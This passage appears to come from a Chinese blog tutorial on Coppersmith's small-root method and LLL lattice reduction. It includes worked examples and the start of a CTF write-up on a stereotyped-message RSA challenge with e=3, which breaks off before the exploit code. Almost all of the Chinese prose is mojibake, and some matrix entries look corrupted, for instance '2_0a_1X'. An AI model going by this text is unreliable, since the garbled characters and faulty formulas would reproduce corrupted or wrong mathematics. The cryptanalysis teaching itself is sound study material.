¸å¿ƒæ€è·¯äº†ï¼Œå…¶å®ä¸€ç‚¹ä¹Ÿä¸éš¾çš„å¼ã€‚</p><p>&emsp;&emsp;æ¥ä¸‹æ¥ä¸»è¦æ˜¯å¯¹è¿™ä¸ª$x_0$çš„ç•Œçš„ä¸€äº›è®¨è®ºä»¥åŠå¦‚ä½•å°½é‡çš„æé«˜è¿™ä¸ªç•Œçš„ä¸€äº›æ‰‹æ³•ã€‚</p><p>&emsp;&emsp;æˆ‘ä»¬å®šä¹‰$X$ä¸ºè¿™ä¸ª$|x_0|$å–å€¼çš„ä¸Šç•Œï¼Œ</p><p>&emsp;&emsp;ç„¶åæˆ‘ä»¬å°†$F(x)$è¡¨ç¤ºä¸ºä¸€ä¸ªè¡Œå‘é‡$b_F=(a_0,a_1X,a_2X^2,â€¦,a_dX^d)$</p><h5 id="Theorem-1-Howgrave-Graham"><a href="#Theorem-1-Howgrave-Graham" class="headerlink" title="Theorem 1(Howgrave-Graham)"></a>Theorem 1(Howgrave-Graham)</h5><p>&emsp;&emsp;é¦–å…ˆæˆ‘ä»¬æœ‰$F(x),X,M,b_F$è¿™å‡ ä¸ªä¸Šé¢æåˆ°çš„å€¼</p><p>&emsp;&emsp;ä¹Ÿæœ‰$F(x_0)\equiv 0 \pmod{M}$</p><p>&emsp;&emsp;é‚£ä¹ˆï¼Œå½“$||b_F||&lt;\frac{M}{\sqrt{d+1}}$ï¼Œåˆ™æœ‰$F(x_0) = 0$</p><h6 id="proof"><a href="#proof" class="headerlink" title="proof"></a>proof</h6><p>&emsp;&emsp;é¦–å…ˆæˆ‘ä»¬éœ€è¦çŸ¥é“è‘—åçš„æŸ¯è¥¿ä¸ç­‰å¼ $(\sum_\limits{i=1}^{n}x_iy_i)^2â‰¤(\sum_\limits{i=1}^{n}x_i^2)(\sum_\limits{i=1}^{n}y_i^2)$,</p><p>&emsp;&emsp;è®¾$y_i=1ï¼Œx_iâ‰¥0ï¼Œ1â‰¤iâ‰¤n$ï¼Œé‚£ä¹ˆæˆ‘ä»¬æœ‰$\sum_\limits{i=1}^{n}x_iâ‰¤\sqrt{n\sum_\limits{i=1}^{n}x_i^2}=\sqrt{n}||(x_1,â€¦,x_i)||$</p><p>&emsp;&emsp;å› è€Œ$|F(x_0)|=|\sum_\limits{i=1}^{d}a_ix_0^i|â‰¤\sum_\limits{i=1}^{d}|a_i||x_0|^iâ‰¤\sum_\limits{i=1}^{d}|a_i|X^iâ‰¤\sqrt{d+1}||b_F||&lt;\frac{\sqrt{d+1}M}{\sqrt{d+1}}=M$</p><p>&emsp;&emsp;æ‰€ä»¥$-M&lt;F(x_0)&lt;M$ï¼Œåˆå› ä¸º$F(x_0)\equiv 0 \pmod{M}$,æ‰€ä»¥$F(x_0)= 0 $</p><p>&emsp;&emsp;ã€è¿™é‡Œä¸ç­‰å¼çš„ç¬¬ä¸‰ä¸ªå°±ç”¨åˆ°äº†æŸ¯è¥¿ä¸ç­‰å¼çš„æ€§è´¨ã€‘</p><p>&emsp;&emsp;è¿™ä¸ªå®šç†å¯¹äºç¡®å®š$x_0$çš„è¾¹ç•Œå€¼$X$å¾ˆé‡è¦ã€‚</p><p>&emsp;&emsp;ä¹‹å‰æˆ‘ä»¬æ‰¾åˆ°çš„G(x)æˆ‘ä»¬ç›´æ¥ç»™å‡ºçš„ï¼Œç°åœ¨å¼€å§‹è¯´è¿™ä¸ª$G(x)$è¯¥æ€ä¹ˆå»æ‰¾ï¼Œé¦–å…ˆæˆ‘ä»¬è€ƒè™‘åº¦ä¸º$d-1$çš„å¤šé¡¹å¼$G_i(x) = Mx^i(0â‰¤i&lt;d) $ï¼Œè¿˜æœ‰ä¸€ä¸ª$F(x)$ï¼Œæ˜¾ç„¶ï¼Œè¿™é‡Œä¸€å…±d+1æ¡å¼å­ï¼Œä»–ä»¬çš„å‡æœ‰è§£$x = x_0 \pmod{M}$ï¼Œæˆ‘ä»¬å°†ä»–ä»¬çš„ç³»æ•°å‘é‡ç»„åˆæˆä¸€ä¸ªçŸ©é˜µ$B = \begin{bmatrix} M&amp;0&amp;\dots&amp;0&amp;0 \newline 0&amp;MX&amp;\dots&amp;0&amp;0 \newline \vdots&amp;\vdots&amp;\ddots&amp;\vdots \newline 0&amp;0&amp;\dots&amp;MX^{d-1}&amp;0 \newline a_0 &amp;a_1X&amp;\dots &amp;a_{d-1}X^{d-1}&amp;X^d\end{bmatrix}$ï¼Œ$X$ä¸º$x_0$çš„å–å€¼ä¸Šç•Œ</p><p>&emsp;&emsp;æ˜¾ç„¶ï¼Œè¿™ä¸ªçŸ©é˜µçš„è¡Œåˆ—å¼ä¸ºï¼š$det(L)=M^dX^{d(d+1)/2}$</p><p>&emsp;&emsp;ç„¶åæˆ‘ä»¬åˆ©ç”¨LLLç®—æ³•åšä¸€ä¸ªæ ¼åŸºè§„çº¦ï¼Œç„¶åè®¾è§„çº¦åçš„çŸ©é˜µçš„ç¬¬ä¸€è¡Œè¡Œå‘é‡ä¸º$bâ€™$ï¼Œè¿™ä¸€ç‚¹éœ€è¦ç”¨åˆ°LLLçš„ä¸€ä¸ªæ€§è´¨å°±æ˜¯ï¼Œ</p><p>&emsp;&emsp;$||bâ€™||â‰¤2^{\frac{n-1}{4}}det(L)^{\frac{1}{n}}$ï¼Œæ‰€ä»¥$||bâ€™||â‰¤ 2^{\frac{d}{4}}M^{\frac{d}{d+1}}X^{\frac{d}{2}}$</p><p>&emsp;&emsp;ä¸ºäº†æ»¡è¶³Theorem 1ï¼Œæ•…è¦æ±‚$2^{\frac{d}{4}}M^{\frac{d}{d+1}}X^{\frac{d}{2}}&lt;\frac{M}{\sqrt{d+1}}$ï¼Œç§»é¡¹ä¸€ä¸‹å¯å¾—$2^{\frac{d}{4}}\sqrt{d+1}X^{\frac{d}{2}}&lt;M^{\frac{1}{d+1}}$</p><p>&emsp;&emsp;å¦‚æœd=2ï¼Œé‚£ä¹ˆ$Xâ‰ˆM^{\frac{1}{3}}$,å¦‚æœd=3ï¼Œé‚£ä¹ˆ$Xâ‰ˆM^{\frac{1}{6}}$ã€‚</p><p>&emsp;&emsp;è‡³æ­¤ï¼Œæˆ‘ä»¬åˆæ­¥çš„æœ‰äº†ä¸€ä¸ª$X$çš„å–å€¼èŒƒå›´ï¼Œä½†è¿™è¿˜å¹¶æœªè¾¾åˆ°$M^{\frac{1}{d}-\epsilon}$çš„ç¨‹åº¦ã€‚ã€‚ã€‚</p><h5 id="example-2"><a href="#example-2" class="headerlink" title="example 2"></a>example 2</h5><p>&emsp;&emsp;è®¾M=10001ï¼Œå¤šé¡¹å¼$F(x)=x^3+10x^2+5000x-222$ï¼Œã€è¿™é‡Œå…¶å®æˆ‘ä»¬å·²ç»æå‰çŸ¥é“$x_0 = 4$ï¼Œæ‰€ä»¥æ»¡è¶³$x_0 &lt; M^{\frac{1}{6}}$ã€‘</p><p>&emsp;&emsp;è¿™é‡Œæˆ‘ä»¬è®¾$x_0$çš„ä¸Šç•Œ$X=10$ï¼Œæ‰€ä»¥æˆ‘ä»¬æ„é€ æ ¼$B = \begin{bmatrix} M&amp;0&amp;0&amp;0 \newline 0&amp;MX&amp;0&amp;0 \newline  0&amp;0&amp;MX^{2}&amp;0 \newline -222 &amp;5000X&amp;10X^2&amp;X^3\end{bmatrix}$ï¼Œåˆ©ç”¨LLLè§„çº¦åæˆ‘ä»¬å¯ä»¥å¾—åˆ°ç¬¬ä¸€è¡Œ(the first row)ä¸º$(444,10,-2000,-2000)$ï¼Œæ‰€ä»¥æˆ‘ä»¬æ‰¾åˆ°å¤šé¡¹å¼$G(x)=444+x-20x^2-2x^3$ï¼Œæ¥ä¸ªç‰›é¡¿è¿­ä»£æ³•æ±‚æ ¹å¯å¾—$x_0=4$</p><h4 id="The-Full-Coppersmith-Method"><a href="#The-Full-Coppersmith-Method" class="headerlink" title="The Full Coppersmith Method"></a>The Full Coppersmith Method</h4><p>&emsp;&emsp;è¿™é‡Œå›é¡¾ä¸€ä¸‹example 2ï¼Œå³ä½¿ä»¥$M^{\frac{1}{6}}$æ¥è®¡ç®—è¾¹ç•Œä¹Ÿåº”è¯¥æ˜¯4.3å·¦å³ï¼Œé‚£ä¸ºä»€ä¹ˆæˆ‘ä»¬è®¾X=10æœ€ç»ˆä¹Ÿå¯ä»¥å¾—åˆ°æ­£ç¡®çš„ç»“æœå‘¢ï¼Ÿå…¶å®å®¡è§†ä¸€ä¸‹æ•´ä¸ªè¿‡ç¨‹ï¼Œæˆ‘ä»¬æœ€ç»ˆçš„ç›®çš„åªæ˜¯ä¸ºäº†è·å¾—ä¸€ç»„ç³»æ•°ï¼Œæœ€åè§„çº¦å‡ºæ¥çš„è¡Œå‘é‡ä¹Ÿéƒ½åšäº†ç›¸åº”çš„â€å»é™¤Xâ€œå¤„ç†ï¼Œæ‰€ä»¥è¿™é‡Œå¯¹Xçš„å–å€¼å…¶å®å¹¶ä¸ç”¨ç‰¹åˆ«ä¸¥æ ¼ã€‚</p><p>&emsp;&emsp;å…¶æ¬¡ï¼Œå¦‚æœä¸å–è¿™ä¸ªçº¦æ¥çš„è¾¹ç•Œ$M^{\frac{1}{6}}$,è€Œæ˜¯ç›´æ¥å°†d=3å¸¦å…¥$2^{\frac{d}{4}}\sqrt{d+1}X^{\frac{d}{2}}&lt;M^{\frac{1}{d+1}}$æ¥è®¡ç®—è¿™ä¸ªxçš„è¾¹ç•Œï¼Œå…¶å®è¾¹ç•Œå€¼åº”è¯¥æ˜¯2.07å·¦å³ã€‚å—¯ï¼Ÿè¿˜æ˜¯é‚£ä¸ªé—®é¢˜ï¼Œé‚£ä¸ºå•¥æˆ‘ä»¬å¯ä»¥å¾—åˆ°æ­£ç¡®ç»“æœå‘¢ï¼Ÿå› ä¸ºå…¶å®è¿™ä¸ªè¾¹ç•Œå€¼ä¹Ÿå¹¶ä¸æ˜¯å¾ˆä¸¥æ ¼ï¼Œåœ¨æ¨å¯¼å¾—å‡ºè¿™ä¸ªå€¼çš„æ—¶å€™æœ¬èº«å°±ç”¨äº†å¾ˆå¤šæ¬¡ä¸ç­‰å¼ï¼Œå†è€…ï¼Œæˆ‘ä»¬åˆ©ç”¨çš„LLLä¸­çš„é‚£ä¸ªæ€§è´¨ï¼Œ$||bâ€™||â‰¤2^{\frac{n-1}{4}}det(L)^{\frac{1}{n}}$ï¼Œæˆ‘ä»¬å–çš„æ˜¯LLLç®—æ³•è§„çº¦å‡ºæ¥çš„æœ€åçš„æƒ…å†µï¼Œè€Œå¤§å¤šæ•°æƒ…å†µå¾—åˆ°çš„ç»“æœè¦æ¯”è¿™å€¼å°è®¸å¤šã€‚</p><p>&emsp;&emsp;å›åˆ°è¿™ä¸€ç« çš„ä¸»é¢˜ï¼Œåœ¨ä¸Šä¸€ç« ä¸­æˆ‘ä»¬å¯¹Xçš„å–å€¼æœ‰ä¸ç­‰å¼ï¼š$2^{\frac{d}{4}}M^{\frac{d}{d+1}}X^{\frac{d}{2}}&lt;\frac{M}{\sqrt{d+1}}$ï¼Œç¨å¾®è¿˜åŸä¸€ä¸‹æ˜¯$2^{\frac{n-1}{4}}M^{\frac{d}{n}}X^{\frac{d(d+1)}{2n}}&lt;\frac{M}{\sqrt{n}}$ï¼Œæ‰€ä»¥æƒ³è¦å¢åŠ Xå°±æœ‰ä¸¤ä¸ªæ€è·¯ï¼Œä¸€ä¸ªæ˜¯å¾€çŸ©é˜µé‡Œå¤šåŠ å‡ è¡Œå‘é‡æ¥å¢åŠ æ ¼çš„ç»´åº¦$n$ï¼Œç¬¬äºŒä¸ªå°±æ˜¯å¢å¤§$M$äº†ã€‚ã€è¿™ä¸¤ä¸ªæ–¹æ³•åœ¨å…¬å¼å±‚é¢çœ‹èµ·æ¥å¯èƒ½ä¸é‚£ä¹ˆç›´è§‚ï¼Œå…¬å¼è¿˜éœ€è¦å†å˜å½¢ä¸€ä¸‹ï¼Œå¹¶ä¸”åº”è¯¥ä¹Ÿä¼šæœ‰ä¸€ä¸ªæœ€ä¼˜è§£ã€‘</p><p>&emsp;&emsp;é’ˆå¯¹ç¬¬ä¸€ç§æ–¹æ¡ˆï¼Œæˆ‘ä»¬ç§°è¿™ç§å¾€æ ¼é‡Œæ’å…¥çš„ï¼Œå¢åŠ äº†æ ¼çš„ç»´åº¦è€Œä¸å¢åŠ Mçš„å¤šé¡¹å¼ä¸ºï¼šâ€œx-shiftâ€ polynomialï¼Œå®ƒä»¬æ˜¯$xF(x),x^2F(x),â€¦,x^kF(x)$ï¼Œæ˜¾ç„¶è¿™äº›å¤šé¡¹å¼åœ¨Mä¸‹çš„è§£ä¹Ÿä¸º$x_0$ã€‚</p><p>&emsp;&emsp;é’ˆå¯¹ç¬¬äºŒç§æ–¹æ¡ˆï¼Œæˆ‘ä»¬å¯ä»¥åˆ©ç”¨$F(x)$çš„å¹‚æ¥å¢åŠ Mï¼Œå› ä¸º$F(x_0) \equiv 0 \pmod{M}$ï¼Œåˆ™æœ‰$F(x_0)^k \equiv 0 \pmod{M^k}$</p><p>&emsp;&emsp;æˆ‘ä»¬ç»§ç»­æ‹¿ä¸Šæ–‡ä¸­çš„example 2æ¥ä¸¾ä¾‹ï¼Œä¹‹å‰æˆ‘ä»¬ç”¨åˆ°çš„æ ¼çš„ç»´åº¦n=4ï¼Œæ‰€ä»¥d=3ï¼Œå¸¦å…¥é‚£æ¡ä¸ç­‰å¼æˆ‘ä»¬å¯ä»¥å¾—åˆ°$2^{\frac{3}{4}}(M^3X^6)^{\frac{1}{4}}&lt;\frac{M}{\sqrt{4}}$ï¼Œå¸¦å…¥$Mã€X$å¯å¾—$Xâ‰ˆ2.07$ï¼Œç°åœ¨æˆ‘ä»¬å¾€æ ¼ä¸­æ·»åŠ ä¸¤ä¸ªå¤šé¡¹å¼$xF(x),x^2F(x)$ï¼Œå¾—åˆ°</p><p>$B = \begin{bmatrix} M&amp;0&amp;0&amp;0&amp;0&amp;0 \newline 0&amp;MX&amp;0&amp;0&amp;0&amp;0 \newline  0&amp;0&amp;MX^{2}&amp;0&amp;0&amp;0 \newline -222 &amp;5000X&amp;10X^2&amp;X^3&amp;0&amp;0 \newline 0&amp;-222X&amp;5000X^2&amp;10X^3&amp;X^4&amp;0 \newline  0&amp;0&amp;-222X^{2}&amp;5000X^3&amp;10X^4&amp;X^5 \end{bmatrix}$</p><p>&emsp;&emsp;ç°åœ¨æˆ‘ä»¬æ ¼çš„ç»´åº¦ä¸º6ï¼Œå¹¶ä¸”è¡Œåˆ—å¼ä¸º$M^3X^{15}$ï¼Œå¸¦å…¥é‚£æ¡ä¸ç­‰å¼å¯å¾—$2^{\frac{5}{4}}(M^3X^{15})^{\frac{1}{6}}&lt;\frac{M}{\sqrt{6}}$ï¼Œç°åœ¨ç®—å‡ºæ¥$Xâ‰ˆ3.11$ï¼Œå¯ä»¥çœ‹åˆ°é€šè¿‡æ·»åŠ â€œx-shiftâ€ polynomialï¼Œæˆ‘ä»¬ç¡®å®å¢å¤§äº†Xã€‚</p><p>&emsp;&emsp;è¿™é‡Œæœ‰ä¸€ä¸ªç°æˆçš„ç»“è®ºå°±æ˜¯é€šè¿‡æ·»åŠ â€œx-shiftâ€ polynomialï¼š$ xF(x),x^2F(x),â€¦,x^{d-1}F(x)$ï¼Œæˆ‘ä»¬å¯ä»¥ä½¿å¾—$Xâ‰ˆM^{\frac{1}{2d-1}}$ï¼Œæ‰€ä»¥å½“d=3ï¼Œé€šè¿‡â€œx-shiftâ€ polynomialï¼Œæˆ‘ä»¬å°†$Xâ‰ˆM^{\frac{1}{6}}$ æå‡ä¸º$Xâ‰ˆM^{\frac{1}{5}}$ã€‚é‚£ä¹ˆå¦‚æœåœ¨æ­¤åŸºç¡€ä¸Šå†å¢åŠ äº†Må‘¢ï¼Ÿ</p><h5 id="Theorem-2-ï¼ˆCoppersmithï¼‰"><a href="#Theorem-2-ï¼ˆCoppersmithï¼‰" class="headerlink" title="Theorem 2 ï¼ˆCoppersmithï¼‰"></a>Theorem 2 ï¼ˆCoppersmithï¼‰</h5><p>&emsp;&emsp;è®¾$0&lt;\epsilon &lt;min{0.18,\frac{1}{d}} $,$F(x)$ä¸ºåº¦ä¸ºdçš„é¦–ä¸€å¤šé¡¹å¼ï¼Œå¦‚æœå…¶åœ¨åŸŸ$M$ä¸‹æœ‰ä¸€ä¸ªæˆ–å¤šä¸ªæ ¹$x_0$æ»¡è¶³$|x_0|&lt;M^{\frac{1}{d}-\epsilon}$ï¼Œé‚£ä¹ˆæˆ‘ä»¬å°±å¯ä»¥åœ¨ä¸$d,\frac{1}{\epsilon},log(M)$ç›¸å…³çš„å¤šé¡¹å¼æ—¶é—´å†…æ‰¾åˆ°å®ƒï¼Œ</p><h6 id="proof-1"><a href="#proof-1" class="headerlink" title="proof"></a>proof</h6><p>&emsp;&emsp;è®¾$h&gt;1$ï¼Œæ„é€ ä¸€ä¸ªæ ¼$L$ï¼Œç”¨è¿‡å¤šé¡¹å¼ï¼š$G _ {i,j}(x)=M^{h-1-j}F(x)^jx^i,(0â‰¤i&lt;d,0â‰¤j&lt;h)$,æ³¨æ„åˆ°$G _ {i,j}(x_0)\equiv 0 \pmod{M^{h-1}}$ï¼Œé‚£ä¹ˆæ ¼Lçš„ç»´åº¦å°±æ˜¯$dh$ï¼Œå…¶è¡Œåˆ—å¼$det(L)=M^{\frac{(h-1)hd}{2}}X^{\frac{(dh-1)dh}{2}}$</p><p>&emsp;&emsp;ã€è¿™é‡Œå¯èƒ½çœ‹ç€æ¯”è¾ƒæŠ½è±¡ï¼Œæ²¡äº‹ï¼Œå¾…ä¼šä¸‹é¢ä¼šæœ‰ä¸ªä¾‹å­ã€‘</p><p>&emsp;&emsp;æ­¤æ—¶æˆ‘ä»¬è¿ç”¨LLLç®—æ³•è¿›è¡Œè§„çº¦ï¼Œæˆ‘ä»¬å¾—åˆ°ç¬¬ä¸€è¡Œçš„è¡Œå‘é‡$bâ€™$ï¼Œå…¶æ»¡è¶³$||bâ€™||&lt;2^{\frac{dh-1}{4}}det(L)^{\frac{1}{dh}}=2^{\frac{dh-1}{4}}M^{\frac{h-1}{2}}X^{\frac{dh-1}{2}}$</p><p>&emsp;&emsp;ç”±äºè¿™é‡Œçš„åŸŸMå·²ç»æå‡ä¸º$M^{h-1}$ï¼Œè¿™é‡Œæˆ‘ä»¬å†ç”¨ä¸ŠTheorem 1ï¼Œä»è€Œæœ‰$\sqrt{dh}2^{\frac{dh-1}{4}}M^{\frac{h-1}{2}}X^{\frac{dh-1}{2}}&lt;M^{h-1}$,</p><p>&emsp;&emsp;å˜å½¢ä¸€ä¸‹ä¸ºï¼š$\sqrt{dh}2^{\frac{dh-1}{4}}X^{\frac{dh-1}{2}}&lt;M^{\frac{h-1}{2}}$</p><p>&emsp;&emsp;è¿™é‡Œæˆ‘ä»¬æ¢å…ƒä¸€ä¸‹ï¼Œè®¾$c(d,h)=(\sqrt{dh}2^{\frac{dh-1}{4}})^{\frac{2}{h-1}}=\sqrt2(dh)^{\frac{1}{dh-1}}$ï¼Œé‚£ä¹ˆæˆ‘ä»¬æœ‰$c(d,h)X&lt;M^{\frac{h-1}{dh-1}}$</p><p>&emsp;&emsp;æ³¨æ„åˆ°${\frac{h-1}{dh-1}}=\frac{1}{d}-\frac{d-1}{d(dh-1)}$,æˆ‘ä»¬è®¾$\epsilon = \frac{d-1}{d(dh-1)}$ï¼Œé‚£ä¹ˆæœ‰$h=\frac{\frac{d-1}{d \epsilon}+1}{d}â‰ˆ\frac{1}{d\epsilon}$,å¹¶ä¸”$dh=\frac{d-1}{d \epsilon}+1$ï¼Œæ‰€ä»¥$c(d,h)=\sqrt2(\frac{d-1}{d \epsilon}+1)^{\frac{d\epsilon}{d-1}}$,å½“$\epsilon $è¶‹å‘äº0æ—¶ï¼Œ$c(d,h)$è¶‹å‘äº$\sqrt2$ï¼Œ</p><p>&emsp;&emsp;å› ä¸ºä¹‹å‰æˆ‘ä»¬æœ‰$c(d,h)X&lt;M^{\frac{h-1}{dh-1}}$ï¼Œç”¨ä¸Š$\epsilon$å°±æ˜¯$c(d,h)X&lt;M^{\frac{1}{d}-\epsilon}$ï¼Œæ‰€ä»¥è¿™é‡Œå’±å¦‚æœæƒ³è¦è¾¾åˆ°Coppersmithå®šç†çš„é‚£ä¸ªæ•ˆæœï¼Œé‚£ä¹ˆæˆ‘ä»¬éœ€è¦$c(d,h)â‰¤2$ï¼Œè¿™é‡Œæˆ‘ä»¬å†æ¬¡æ¢å…ƒï¼Œè®¾$\alpha=\frac{d\epsilon}{d-1}$ï¼Œé‚£ä¹ˆ$c(d,h)=\sqrt2(\frac{1}{\alpha}+1)^\alpha$,æ‰€ä»¥æˆ‘ä»¬è¦æ±‚$(\frac{1}{\alpha}+1)^\alphaâ‰¤\sqrt2$ï¼Œå› ä¸º$\epsilon = \frac{d-1}{d(dh-1)}â‰¤ \frac{d-1}{d}$ï¼Œæ‰€ä»¥$\alphaâ‰¤1$ï¼Œæ‰€ä»¥è§£å¾—$0â‰¤\alphaâ‰¤0.18$ï¼Œ</p><p>&emsp;&emsp;ç»“åˆä¸Šé¢æåˆ°çš„ï¼š$0&lt;\epsilon &lt;min{0.18,\frac{1}{d}} $ï¼Œç”±äº$0â‰¤\alpha=\frac{d\epsilon}{d-1}â‰¤0.18$ï¼Œå¹¶ä¸”$\frac{1}{d}-\epsilon &gt;0$ï¼Œæ‰€ä»¥å½“$d&gt;5$æ—¶ï¼Œ$\epsilon &lt; \frac{1}{d}$,å½“$0&lt;dâ‰¤5,\epsilon&lt;0.18$ï¼Œ</p><p>&emsp;&emsp;è¿è¡ŒLLLç®—æ³•ç”¨æ—¶è‚¯å®šæ˜¯è·Ÿæ ¼çš„ç»´åº¦ï¼Œæ ¼é‡Œé¢æ•°å€¼å¤§å°æœ‰å…³çš„ï¼Œåˆç”±$h=\frac{\frac{d-1}{d \epsilon}+1}{d}â‰ˆ\frac{1}{d\epsilon}$,æ‰€ä»¥æ ¼Lçš„ç»´åº¦$dhâ‰ˆ\frac{1}{\epsilon}$ï¼Œæ‰€ä»¥æ—¶é—´å¤æ‚åº¦ä¸$d,\frac{1}{\epsilon},log(M)$æœ‰å…³ã€‚è¿™é‡Œä¹Ÿæœ‰ä¸€ä¸ªç»“è®ºå°±æ˜¯ï¼ŒCoppersmithâ€˜s Methodçš„ä¸€ä¸ªå¤§è‡´çš„æ—¶é—´å¤æ‚è¯»ä¸º$O((\frac{1}{\epsilon})^9log(M)^3)$ï¼Œ</p><h5 id="example-3"><a href="#example-3" class="headerlink" title="example 3"></a>example 3</h5><p>&emsp;&emsp;è®¾$p=2^{30}+3,q=2^{32}+15,M=pq$</p><p>&emsp;&emsp;$F(x)=a_0+a_1x+a_2x^2+a_3x^3=1942528644709637042 + 1234567890123456789x + 987654321987654321x^2 + x^3$</p><p>&emsp;&emsp;å¹¶ä¸”æˆ‘ä»¬äº‹å…ˆçŸ¥é“æ ¹:$|x_0|â‰¤2^{14}$ï¼Œæ‰€ä»¥æˆ‘ä»¬è®¾$X=2^{14}$ï¼Œæ³¨æ„åˆ°$Xâ‰ˆM^{\frac{1}{4.4}}$ã€‚è¿™é‡Œæˆ‘ä»¬æ„é€ æ ¼$L = \begin{bmatrix} M^2&amp;0&amp;0&amp;0&amp;0&amp;0&amp;0 \newline 0&amp;M^2X&amp;0&amp;0&amp;0&amp;0&amp;0 \newline  0&amp;0&amp;M^2X^{2}&amp;0&amp;0&amp;0&amp;0 \newline Ma_0 &amp;Ma_1X&amp;Ma_2X^2&amp;MX^3&amp;0&amp;0&amp;0 \newline 0&amp;Ma_0X&amp;Ma_1X^2&amp;Ma_2X^3&amp;MX^4&amp;0&amp;0 \newline  0&amp;0&amp;Ma_0X^{2}&amp;Ma_1X^3&amp;Ma_2X^4&amp;MX^5 &amp;0\newline a_0^2&amp;2_0a_1X&amp;(a_1^2+2a_0a_2)X^2&amp;(2a_0+2a_1a_2)X^3&amp;(a_2^2+2a_1)X^4&amp;2a_2X^5&amp;X^6\end{bmatrix}$</p><p>&emsp;&emsp;æ³¨æ„åˆ°ï¼Œæˆ‘ä»¬è¿™é‡Œå¹¶æ²¡æœ‰åƒproofä¸­çš„é‚£æ ·ï¼ŒåŠ ä¸Šæ‰€æœ‰çš„$G _ {i,j}(x)$ï¼Œè¿™é‡Œæˆ‘ä»¬åªæ·»åŠ é‡ä¸¤æ¡â€œx-shiftâ€ polynomialï¼Œé¢å¤–æ·»åŠ äº†ä¸€æ¡$F(X)^2$ï¼Œç¬¬å››è¡Œä¸º$MF(X)$ã€‚ç†è®ºä¸Šæˆ‘ä»¬è¿˜å¯ä»¥é’ˆå¯¹$F(X)^2$å†æ·»åŠ ä¸¤æ¡â€œx-shiftâ€ polynomialï¼Œä½†è¿™é‡Œå¹¶æ²¡æœ‰è¿™ä¹ˆåšï¼Œæ˜¯ç»¼åˆè€ƒè™‘äº†åˆ°$x_0$çš„ä¸Šç•ŒXï¼Œå’ŒLLLç®—æ³•è¿è¡Œçš„æ—¶é—´å¤æ‚åº¦ã€‚æ‰€ä»¥è¿™é‡Œæ ¼çš„ç»´åº¦æ˜¯7ï¼Œè¡Œåˆ—å¼$det(L)=M^9X^{21}$ã€‚</p><p>&emsp;&emsp;è¿™é‡Œè¿è¡ŒLLLç®—æ³•ï¼Œå¹¶å°†ç¬¬ä¸€è¡Œçš„è¡Œå‘é‡çš„ç›¸åº”Xå€¼å»é™¤å¾—åˆ°ç³»æ•°å‘é‡ï¼Œå¯å¾—$G(x)=-369928294330603367352173305173409792 + 88565517701781911148679362207202x<br>-3439987357258441728608570659x^2 + 446358057645551896819258x^3<br>+4564259979987386926x^4 - 1728007960413053x^5 - 21177681998x^6$</p><p>è¿ç®—æ±‚æ ¹ç®—æ³•å¯å¾—$x_0=16384$</p><p>&emsp;&emsp;åˆ°è¿™é‡Œï¼Œæˆ‘ä»¬å¯¹äºå•å…ƒCoppersmithâ€™s Methodçš„åŸç†å­¦ä¹ å°±å‘Šä¸€æ®µè½äº†ã€‚è‡³äºæœ€åˆè¯´çš„$x_0$çš„å–å€¼ä¸Šç•Œå¯ä»¥è¾¾åˆ°$M^{\frac{1}{d}-\epsilon}$ï¼Œè€Œä¸ºå•¥æœ€åæˆ‘ä»¬è¯æ˜å‡ºæ¥çš„æ˜¯å´æ˜¯$\frac{1}{2}M^{\frac{1}{d}-\epsilon}$ã€‚ä»Coppersmith å®šç†çš„è¯æ˜è¿‡ç¨‹æ¥çœ‹ï¼Œåº”è¯¥æ˜¯ä¸$\alpha$çš„å–å€¼èŒƒå›´æœ‰å…³ã€‚</p><h2 id="å®ä¾‹-ç¬¬ä¸‰å±Šå¼ºç½‘æ¯ä¹‹copper-study"><a href="#å®ä¾‹-ç¬¬ä¸‰å±Šå¼ºç½‘æ¯ä¹‹copper-study" class="headerlink" title="å®ä¾‹-ç¬¬ä¸‰å±Šå¼ºç½‘æ¯ä¹‹copper study"></a>å®ä¾‹-ç¬¬ä¸‰å±Šå¼ºç½‘æ¯ä¹‹copper study</h2><h3 id="ç¬¬ä¸€å…³ï¼šStereotyped-messages"><a href="#ç¬¬ä¸€å…³ï¼šStereotyped-messages" class="headerlink" title="ç¬¬ä¸€å…³ï¼šStereotyped messages"></a>ç¬¬ä¸€å…³ï¼šStereotyped messages</h3><p>å·²çŸ¥n,e=3,cï¼Œmå…±512bitä½†æ˜¯ä½72bitæœªçŸ¥ï¼ŒåŸç†å¯å‚è€ƒ<a href="https://www.math.auckland.ac.nz/~sgal018/crypto-book/ch19.pdf" target="_blank" rel="noopener">Mathematics of Public Key Cryptography ch19</a>ã€‚ä¹Ÿå³å‰æ–‡æ‰€è¿°ã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">[+]Generating challenge <span class="number">1</span></span><br><span class="line">[+]n=<span class="number">0x44e360ce873d18d33eecc0829eb0801e71950e26576963c470f91f4c5e7f3e951f65404c6a87f4328495c9c64d39271f3317081aeab34bdf350c5f9bf0c5a49668f763cbf404e66f210336042c6a6e43eed6c6eaca69287ed91b2841148668fd3881b241317574cc8b307fb41593ff7caaa6f09e32f657399c63fe5f68995c5dL</span></span><br><span class="line">[+]e=<span class="number">3</span></span><br><span class="line">[+]m=random.getrandbits(<span class="number">512</span>)</span><br><span class="line">[+]c=pow(m,e,n)=<span class="number">0x20d40eecc8108d6c57b0ea2e1d7d165fb342813764f3760baf71e7929e3c22476de15b5e665ff8b869b5ed3a672aad4e9ef330bb7e18329ce2d0cccae369e244002882a273d3bf5a13b8936974768a920f5cbee52d0bb0323f867ff6305c5aa7ceb99453172332cd9837fdb05d6ea2d7eac39fd0d39960dc9ddbdd40f82b444bL</span></span><br><span class="line">[+]((m&gt;&gt;<span class="number">72</span>)&lt;&lt;<span class="number">72</span>)=<span class="number">0x5377a12cada023e2714b4a9e80f1da87ca567f084e2862e704b813cd7f69b8dbbf67d60e73610fabb7896eeb3cc5a2c0915d03f9f8d44d000000000000000000L</span></span><br><span class="line">[-]long_to_bytes(m).encode(<span class="string">'hex'</span>)=</span><br></pre></td></tr></table></figure><p>è¿™é“é¢˜æˆ‘ä»¬å®Œå…¨å¯ä»¥å°†é¢˜é¢è½¬åŒ–ä¸ºåœ¨æ±‚æ–¹ç¨‹$f(x) = (m+x)^3$ åœ¨æ¨¡Nä¸‹çš„è§£</p><p>æ‰€ä»¥å¯ä»¥ç›´æ¥å¥—æˆ‘ä»¬å‰é¢æ‰€æè¿°çš„æ–¹æ³•</p><p>exp:</p><figure class="highlight 